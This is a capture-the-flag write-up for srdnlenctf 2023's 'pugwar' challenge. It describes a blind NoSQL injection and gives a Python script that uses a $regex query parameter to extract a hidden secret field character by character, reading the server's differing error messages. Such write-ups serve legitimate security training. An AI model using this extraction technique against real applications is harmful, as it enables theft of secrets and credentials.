# srdnlenctf 2023

## pugwar (X solves)

What do you call a cold pug? A pugsicle!


### Solution

In this challenge you need to perform a NoSQL injection attack. The flag is contained inside the secret field of the pug named Mario. In order to leak the flag, it is possible to exploit a vulnerability in the /fighter-customization endpoint. The DB executes queries even if the Fighter pugName entered is not yours, and in case the query is valid, we can distinguish a valid query response (server responds with "You can't customize other players fighter!") from an invalid one ("There are no fighters with that pugName!"). 

### Exploit

```python
#!/bin/env python3

from requests import *
from string import ascii_letters, digits

host = "http://pugwar.srdnlen.challs.it"
path_solve = "/fighter-customization?pugName=Mario&secret[$regex]=^"
path_register = "/register-user"
flag = ""

alphabet = ascii_letters + digits + '{}_'

def register_user(username, password):
    r = session.post(f'{host}{path_register}', json={'username': username, 'password': password})


session = Session()
register_user('srdnlen', 'srdnlen')

while not flag.endswith("}"):
    for c in alphabet:
        response = session.get(f"{host}{path_solve}{flag}{c}")
        if("You can&#x27;t customize other players fighter!" in response.text):
            flag = flag + c
            

print(flag)

```
